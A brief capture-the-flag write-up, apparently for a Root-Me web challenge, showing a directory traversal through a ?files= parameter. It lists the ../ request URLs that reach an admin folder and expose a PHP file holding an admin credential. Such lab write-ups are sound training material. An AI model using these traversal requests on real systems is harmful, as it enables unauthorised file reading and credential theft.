Well, as usual the page is loaded thanks to an argument ?files=...

We go to:

```
http://challenge01.root-me.org/web-serveur/ch16/?files=../
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin/
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php
```

We can read
```
$realm = 'PHP Restricted area';
$users = array('admin' => 'FLAG');
```

'Gratz
